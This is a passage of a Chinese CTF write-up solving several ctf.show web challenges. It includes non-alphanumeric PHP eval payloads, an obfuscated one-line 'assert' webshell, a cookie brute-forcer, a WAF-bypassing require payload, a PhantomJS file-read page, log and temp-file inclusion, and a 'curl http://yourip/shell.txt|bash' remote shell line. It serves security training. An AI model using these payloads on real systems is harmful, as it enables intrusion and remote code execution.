class="string">'n'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>);</span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"echo($code);"</span>);</span><br><span class="line"><span class="meta">?&gt;</span>wu</span><br></pre></td></tr></table></figure><p><code>$hint</code>是hhh.php内容的base形式，可通过post或get方法传入code，<code>$_</code>是一个包含了所有小写字母和<code>~,^</code>的 数组并传递给了<code>$blacklist</code>，遍历<code>$blacklist</code>，如果匹配到了数组内的元素，输出nonono，执行传入的<code>$code</code>但有个echo挡了一下。</p><h4 id="解1：数组下标取值"><a href="#解1：数组下标取值" class="headerlink" title="解1：数组下标取值"></a>解1：数组下标取值</h4><p>由于并未过滤<code>$</code>和<code>[]</code>，可以用数组的下标数字把数组内的值取出来组合，比如<code>ls /</code>就变成了<code>$_[13]$_[18] /</code>，那么<br><code>$__：$_[18].$_[24].$_[18].$_[19].$_[4].$_[11] =&gt; system</code><br><code>$___：$_[13].$_[18].&#39; &#39;.&#39;/&#39; =&gt; ls /</code><br>拼接一下即可</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707213715.png" alt=""></p><p><code>12)</code>闭合前面<code>echo(</code>，<code>(12</code>闭合后面的<code>)</code><br>不闭合也行，php中，反引号可以用来执行命令，比如echo</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707214159.png" alt=""></p><p>那么也不需要点号拼接值了，直接执行</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707214350.png" alt=""></p><p>构造相应的<code>cat /flag</code>即可</p><h4 id="解2：位移运算符"><a href="#解2：位移运算符" class="headerlink" title="解2：位移运算符"></a>解2：位移运算符</h4><p>Ascii表中，<code>&#39;@&#39;|&#39;(任何左侧符号)&#39;==&#39;(右侧小写字母)&#39;</code>，比如<code>&#39;@&#39;|&#39;!&#39;==&#39;a&#39;</code>,<code>&#39;@&#39;|&#39;(&#39;==&#39;h&#39;</code></p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707220249.png" alt=""></p><p>那么我们构造<code>&#39;@@@@&#39;|&#39;().4&#39;</code>就是hint，传入<code>($_ = &#39;@@@@&#39;|&#39;().4&#39;) == 1?1:$$_</code>，如果<code>&#39;@@@@&#39;|&#39;().4&#39;!=1</code>，就会执行<code>$$_</code>，也就是echo出<code>$hint</code></p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707220607.png" alt=""></p><p>解码得<code>&lt;?php $a=&quot;/phpjiami.zip\n/hint.php&quot;; ?&gt;</code>，phpjiami.zip下载下来是一个混淆的php源码</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707220943.png" alt=""></p><p>解码脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function decrypt($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $data_1 &#x3D; &#39;&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $ch &#x3D; ord($data[$i]);</span><br><span class="line">        if ($ch &lt; 245) &#123;</span><br><span class="line">            if ($ch &gt; 136) &#123;</span><br><span class="line">                $data_1 .&#x3D; chr($ch &#x2F; 2);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $data_1 .&#x3D; $data[$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $data_1 &#x3D; base64_decode($data_1);</span><br><span class="line">    $key &#x3D; md5($key);</span><br><span class="line">    $j &#x3D; $ctrmax &#x3D; 32;</span><br><span class="line">    $data_2 &#x3D; &#39;&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; strlen($data_1); $i++) &#123;</span><br><span class="line">        if ($j &lt;&#x3D; 0) &#123;</span><br><span class="line">            $j &#x3D; $ctrmax;</span><br><span class="line">        &#125;</span><br><span class="line">        $j--;</span><br><span class="line">        $data_2 .&#x3D;  $data_1[$i] ^ $key[$j];</span><br><span class="line">    &#125;</span><br><span class="line">    return $data_2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function find_data($code)</span><br><span class="line">&#123;</span><br><span class="line">    $code_end &#x3D; strrpos($code, &#39;?&gt;&#39;);</span><br><span class="line">    if (!$code_end) &#123;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $data_start &#x3D; $code_end + 2;</span><br><span class="line">    $data &#x3D; substr($code, $data_start, -46);</span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function find_key($code)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; $v1 &#x3D; $v2(&#39;bWQ1&#39;);</span><br><span class="line">    &#x2F;&#x2F; $key1 &#x3D; $v1(&#39;??????&#39;);</span><br><span class="line">    $pos1 &#x3D; strpos($code, &quot;(&#39;&quot; . preg_quote(base64_encode(&#39;md5&#39;)) . &quot;&#39;);&quot;);</span><br><span class="line">    $pos2 &#x3D; strrpos(substr($code, 0, $pos1), &#39;$&#39;);</span><br><span class="line">    $pos3 &#x3D; strrpos(substr($code, 0, $pos2), &#39;$&#39;);</span><br><span class="line">    $var_name &#x3D; substr($code, $pos3, $pos2 - $pos3 - 1);</span><br><span class="line">    $pos4 &#x3D; strpos($code, $var_name, $pos1);</span><br><span class="line">    $pos5 &#x3D; strpos($code, &quot;(&#39;&quot;, $pos4);</span><br><span class="line">    $pos6 &#x3D; strpos($code, &quot;&#39;)&quot;, $pos4);</span><br><span class="line">    $key &#x3D; substr($code, $pos5 + 2, $pos6 - $pos5 - 2);</span><br><span class="line">    return $key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$input_file &#x3D; $argv[1];</span><br><span class="line">$output_file &#x3D; $argv[1] . &#39;.decrypted.php&#39;;</span><br><span class="line"></span><br><span class="line">$code &#x3D; file_get_contents($input_file);</span><br><span class="line"></span><br><span class="line">$data &#x3D; find_data($code);</span><br><span class="line">if (!$code) &#123;</span><br><span class="line">    echo &#39;未找到加密数据&#39;, PHP_EOL;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key &#x3D; find_key($code);</span><br><span class="line">if (!$key) &#123;</span><br><span class="line">    echo &#39;未找到秘钥&#39;, PHP_EOL;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$decrypted &#x3D; decrypt($data, $key);</span><br><span class="line">$uncompressed &#x3D; gzuncompress($decrypted);</span><br><span class="line">&#x2F;&#x2F; 由于可以不勾选代码压缩的选项，所以这里判断一下是否解压成功，解压失败就是没压缩</span><br><span class="line">if ($uncompressed) &#123;</span><br><span class="line">    $decrypted &#x3D; str_rot13($uncompressed);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $decrypted &#x3D; str_rot13($decrypted);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($output_file, $decrypted);</span><br><span class="line">echo &#39;解密后文件已写入到 &#39;, $output_file, PHP_EOL;</span><br></pre></td></tr></table></figure><p><code>php 脚本.php 目标.php</code>即可解码</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707221641.png" alt=""></p><p>解码有个一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?php @eval(&quot;&#x2F;&#x2F;Encode by  phpjiami.com,Free user.&quot;); ?&gt;&lt;?php</span><br><span class="line">$ch &#x3D; explode(&quot;.&quot;,&quot;hello.ass.world.er.rt.e.saucerman&quot;);</span><br><span class="line">$c &#x3D; $ch[1].$ch[5].$ch[4]; </span><br><span class="line">@$c($_POST[7-1]);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br></pre></td></tr></table></figure><p>访问hint.php，6=system(‘cat /flag’)即可</p><h4 id="解3：无字母数字rce"><a href="#解3：无字母数字rce" class="headerlink" title="解3：无字母数字rce"></a>解3：无字母数字rce</h4><p>p神文章：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p>POST传入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_&#x3D;[];$_&#x3D;@&quot;$_&quot;;$_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;];$___&#x3D;$_;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.&#x3D;$__;$___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.&#x3D;$__;$____&#x3D;&#39;_&#39;;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.&#x3D;$__;$_&#x3D;$$____;$___($_[_]);</span><br><span class="line"></span><br><span class="line">_&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure><p>同样用<code>12)</code>，<code>(12</code>闭合echo，另外最好整个url编码一下，类型x-www-form-urlencoded</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707223453.png" alt=""></p><h3 id="给你shell"><a href="#给你shell" class="headerlink" title="给你shell"></a>给你shell</h3><p>打开靶机只有一句<code>I prepared a webshell for you</code>，源码处有隐藏跳转</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708081717.png" alt=""></p><p>访问得源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//It's no need to use scanner. Of course if you want, but u will find nothing.</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'view_source'</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCookie</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    $arr = explode(<span class="string">':'</span>, $s);</span><br><span class="line">    <span class="keyword">if</span> ($arr[<span class="number">0</span>] === <span class="string">'&#123;"secret"'</span> &amp;&amp; preg_match(<span class="string">'/^[\"0-9A-Z]*&#125;$/'</span>, $arr[<span class="number">1</span>]) &amp;&amp; count($arr) === <span class="number">2</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !theFirstTimeSetCookie() ) setcookie(<span class="string">'secret'</span>, <span class="string">''</span>, time()<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">haveFun</span><span class="params">($_f_g)</span> </span>&#123;</span><br><span class="line">    $_g_r = <span class="number">32</span>;</span><br><span class="line">    $_m_u = md5($_f_g);</span><br><span class="line">    $_h_p = strtoupper($_m_u);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $_g_r; $i++) &#123;</span><br><span class="line">        $_i = substr($_h_p, $i, <span class="number">1</span>);</span><br><span class="line">        $_i = ord($_i);</span><br><span class="line">        print_r($_i &amp; <span class="number">0xC0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>($_COOKIE[<span class="string">'secret'</span>]) ? $json = $_COOKIE[<span class="string">'secret'</span>] : setcookie(<span class="string">'secret'</span>, <span class="string">'&#123;"secret":"'</span> . strtoupper(md5(<span class="string">'y1ng'</span>)) . <span class="string">'"&#125;'</span>, time()+<span class="number">7200</span> );</span><br><span class="line">checkCookie($json) ? $obj = @json_decode($json, <span class="keyword">true</span>) : <span class="keyword">die</span>(<span class="string">'no'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($obj &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'give_me_shell'</span>])) &#123;</span><br><span class="line">    ($obj[<span class="string">'secret'</span>] != $flag_md5 ) ? haveFun($flag) : <span class="keyword">echo</span> <span class="string">"here is your webshell: $shell_path"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>;</span><br></pre></td></tr></table></figure><p><code>checkcookie</code>要求传入的cookie只能包含一对键值并且值只能是这个正则允许的字符<br><code>havefun</code>把传入的值md5处理，字母转换为大写并按位<code>&amp;</code>运算，如果是数字和<code>0xC0</code>来<code>&amp;</code>结果就是0，如果是字母则结果是64<br>通过checkCookie则把cookie保存在<code>$obj</code><br>如果cookie中secret的值和<code>$flag_md5</code>相等，则给出<code>shell_path</code>，不等则调用havefun</p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>get传入<code>give_me_shhell</code>，给出了havafun处理后的结果</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708105953.png" alt=""></p><p>可以看到前三位都是0，那么前三位都是数字，从第四位开始有字母，由于<code>!=</code>是弱比较，因此只要数值和字符串的前三位相等，php就会返回true，那么爆破一下即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;9a0e6a1b-5544-4e24-bcc8-3e31e1701c52.chall.ctf.show&#x2F;?give_me_shell&quot;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">for i in range(10):</span><br><span class="line">        for j in range(10):</span><br><span class="line">                for k in range(10):</span><br><span class="line">                        headers &#x3D; &#123;</span><br><span class="line">                                &#39;cookie&#39;:&#39;secret&#x3D;&#123;&quot;secret&quot;: &#39;+str(i)+str(j)+str(k)+&#39;&#125;&#39;</span><br><span class="line">                      &#125;</span><br><span class="line">                        res &#x3D; s.get(url,headers &#x3D; headers)</span><br><span class="line">                        if &quot;here is your&quot; in res.text:</span><br><span class="line">                                print(headers)</span><br><span class="line">                                break</span><br></pre></td></tr></table></figure><p>得到115，构造<code>{&quot;secret&quot;: 115}</code>替换原来的cookie即可，刷新得到<code>$shell_path</code></p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708111256.png" alt=""></p><p>访问又得源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;there are some secret waf that you will never know, fuzz me if you can</span><br><span class="line">require &quot;hidden_filter.php&quot;;</span><br><span class="line"></span><br><span class="line">if (!$_SESSION[&#39;login&#39;])</span><br><span class="line">    die(&#39;&lt;script&gt;location.href&#x3D;\&#39;.&#x2F;index.php\&#39;&lt;&#x2F;script&gt;&#39;);</span><br><span class="line"></span><br><span class="line">if (!isset($_GET[&#39;code&#39;])) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    exit();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if (!preg_match($secret_waf, $code)) &#123;</span><br><span class="line">        &#x2F;&#x2F;清空session 从头再来</span><br><span class="line">        eval(&quot;\$_SESSION[&quot; . $code . &quot;]&#x3D;false;&quot;); &#x2F;&#x2F;you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span><br><span class="line">    &#125; else die(&#39;hacker&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"> * When you feel that you are lost, do not give up, fight and move on.</span><br><span class="line"> * Being a hacker is not easy, it requires effort and sacrifice.</span><br><span class="line"> * But remember … we are legion!</span><br><span class="line"> *  ————Deep CTF 2020</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure><p>黑名单不可见需要自己测试，如果没有session会跳转，eval只能执行session</p><p>fuzz后过滤内容:</p><blockquote><p>f、sys、include<br>括号、引号、分号<br>^ &amp;等运算符<br>空格 / \ $ ` * #等符号</p></blockquote><p>payload：<code>]=1?&gt;&lt;?=require~%d0%99%93%9e%98%d1%8b%87%8b?&gt;</code></p><p><code>]=1</code>把<code>$_SESSION</code>闭合，由于分号被过滤使用<code>?&gt;&lt;?</code>来bypass，取反<code>~%d0%99%93%9e%98%d1%8b%87%8b =&gt; /flag.txt</code>，require函数可以不需要括号并且由于PHP黑魔法 <code>require</code>和取反运算符之间也不需要空格就能执行，最后<code>?&gt;</code>闭合</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708114503.png" alt=""></p><p>同样方法构造即可，payload：<code>]=1?&gt;&lt;?=require~%d0%99%93%9e%98?&gt;</code></p><h3 id="RemoteImageDownloader"><a href="#RemoteImageDownloader" class="headerlink" title="RemoteImageDownloader"></a>RemoteImageDownloader</h3><p>打开靶机一个提交框可以访问外网文件，考点是PhantomJS任意文件读取</p><p>在<a href="https://www.gem-love.com/ctf/2127.html#Screenshoter(469)" target="_blank" rel="noopener">y1ng师傅</a>文章里找到<a href="https://web.archive.org/web/20191220171022/https://www.darkmatter.ae/blogs/breaching-the-perimeter-phantomjs-arbitrary-file-read/" target="_blank" rel="noopener">参考文章</a></p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708133153.png" alt=""></p><h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><p>在自己的服务器上创建个文件读本地flag，内容如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">x=<span class="keyword">new</span> XMLHttpRequest;</span></span><br><span class="line"><span class="actionscript">x.onload=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(<span class="keyword">this</span>.responseText)</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="actionscript">x.open(<span class="string">"GET"</span>,<span class="string">"file:///flag"</span>);</span></span><br><span class="line">x.send();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问该文件地址，得到图片flag</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708134540.png" alt=""></p><h3 id="WEB-ALL-INFO-U-WANT"><a href="#WEB-ALL-INFO-U-WANT" class="headerlink" title="WEB_ALL_INFO_U_WANT"></a>WEB_ALL_INFO_U_WANT</h3><p>打开靶机可以玩魔方，源码处发现注释</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708135153.png" alt=""></p><p>扫描之后发现备份文件</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708135349.png" alt=""></p><p>下载后源码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">visit all_info_u_want.php and you will get all information you want</span><br><span class="line"></span><br><span class="line">&#x3D; &#x3D;Thinking that it may be difficult, i decided to show you the source code:</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;give you all information you want</span><br><span class="line">if (isset($_GET[&#39;all_info_i_want&#39;])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;file&#39;])) &#123;</span><br><span class="line">    $file &#x3D; &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;&quot; . $_GET[&#39;file&#39;];</span><br><span class="line">    &#x2F;&#x2F;really baby include</span><br><span class="line">    include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>传入<code>all_info_i_want</code>显示phpinfo，包含传入的file。</p><h4 id="解1：日志文件包含"><a href="#解1：日志文件包含" class="headerlink" title="解1：日志文件包含"></a>解1：日志文件包含</h4><p>nginx日志默认路径是<code>/var/log/nginx/access.log</code></p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708140634.png" alt=""></p><p>往User-Agent写入一句话</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708142533.png" alt=""></p><p>再用蚁剑连接即可，但这里文件不容易找，所以反弹shell到自己服务器<br><code>a=system(&#39;curl http://yourip/shell.txt|bash&#39;);</code></p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708143045.png" alt=""></p><p>直接搜flag文件名找不到，学到了新的flag搜索方式，即搜索文件内容<br><code>find /etc -name &quot;*&quot; | xargs grep &quot;flag{&quot;</code></p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708143153.png" alt=""></p><h4 id="解2：临时文件包含"><a href="#解2：临时文件包含" class="headerlink" title="解2：临时文件包含"></a>解2：临时文件包含</h4><p>php会在脚本执行结束后删掉临时文件，通过自身包含自身使之进入死循环，打断死循环让php执行不结束，临时文件就保存下来了<br>构造上传表单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;96013011-1e57-4c9c-b295-bba1c7e3c44d.chall.ctf.show&#x2F;all_info_u_want.php?file&#x3D;all_info_u_want.php&amp;all_info_i_want&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;filename&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>上传一句话文件</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708144734.png" alt=""></p><p>跳转之后手动停掉死循环</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708144844.png" alt=""></p><p>就可以看到临时文件路径了</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708145037.png" alt=""></p><p>包含它即可</p><p><img 